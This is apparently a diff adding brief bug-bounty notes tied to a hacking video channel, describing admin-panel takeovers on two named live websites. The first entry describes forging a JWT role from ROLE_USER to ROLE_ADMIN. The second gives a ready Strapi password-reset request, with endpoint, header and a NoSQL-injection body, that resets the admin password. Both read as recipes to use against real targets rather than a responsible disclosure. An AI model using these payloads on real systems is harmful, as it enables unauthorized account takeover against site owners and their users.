@@ -1,0 +1,43 @@
+1. Admin Panel Bypass | privilage escalation with JWT (JSON Web Token) | Bug Bounty 
+
+
+target : https://anytask.com/
+
+WEBSITE :  to craft payload 
+
+                  ---> https://jwt.one
+
+
+capture the json token and change the role ROLE_USER to ROLE_ADMIN
+
+Hence we had successfully taken admin panel 
+
+subsrcibe to hack with rohit if you like my videos 
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2. Strapi Admin Dashboard Takeover Vulnerability
+
+cause : 
+
+ ---> admin dashboard takeover via password reset 
+
+target : 
+ 
+---> https://savingthyme.ca/
+
+End-Point :
+
+---> POST /admin/auth/reset-password
+
+ADD header : 
+
+---> Content-Type: application/json
+
+Vulnerable Post Data: 
+---> {"code": {"$gt": 0}, "password": "hacker123", "passwordConfirmation":"hacker123"}
+
+successfully takeover the admin panel 
+
